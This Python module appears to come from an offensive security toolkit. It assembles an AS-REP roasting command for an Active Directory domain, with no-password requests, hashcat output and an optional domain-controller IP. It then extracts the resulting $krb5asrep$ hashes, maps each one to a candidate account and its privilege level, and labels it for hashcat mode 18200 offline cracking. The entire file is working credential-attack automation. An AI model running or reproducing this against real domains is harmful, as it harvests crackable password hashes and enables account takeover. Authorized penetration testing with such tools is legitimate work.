from __future__ import annotations

from pathlib import Path
from typing import Any

ASREP_HASHCAT_MODE = 18200


def build_asreproast_command(
    *,
    binary: str,
    domain: str,
    users_file: Path,
    output_file: Path,
    domain_controller: str | None = None,
) -> list[str]:
    command = [
        binary,
        f"{domain}/",
        "-usersfile",
        str(users_file),
        "-no-pass",
        "-format",
        "hashcat",
        "-outputfile",
        str(output_file),
    ]
    if domain_controller:
        command.extend(["-dc-ip", domain_controller])
    return command


def extract_asreproast_records(
    lines: list[str],
    *,
    candidate_accounts: list[dict[str, Any]],
    target: str,
) -> list[dict[str, Any]]:
    records: list[dict[str, Any]] = []
    account_indexes: dict[str, dict[str, Any]] = {}
    for account in candidate_accounts:
        account_name = str(account.get("account_name") or "").strip()
        principal = str(account.get("user_principal_name") or "").strip().lower()
        if account_name:
            account_indexes[account_name.lower()] = account
        if principal:
            account_indexes[principal] = account

    for raw_line in lines:
        line = str(raw_line or "").strip()
        if not line or not line.startswith("$krb5asrep$"):
            continue
        matched_account = None
        for key, account in account_indexes.items():
            if key and key in line.lower():
                matched_account = account
                break
        if matched_account is None:
            continue
        records.append(
            {
                "target": target,
                "account_name": str(matched_account.get("account_name") or "").strip(),
                "user_principal_name": (
                    str(matched_account.get("user_principal_name") or "").strip() or None
                ),
                "privilege_level": str(
                    matched_account.get("privilege_level") or "standard"
                ).strip()
                or "standard",
                "hash": line,
                "hashcat_mode": ASREP_HASHCAT_MODE,
                "source": "asreproast",
            }
        )
    return records
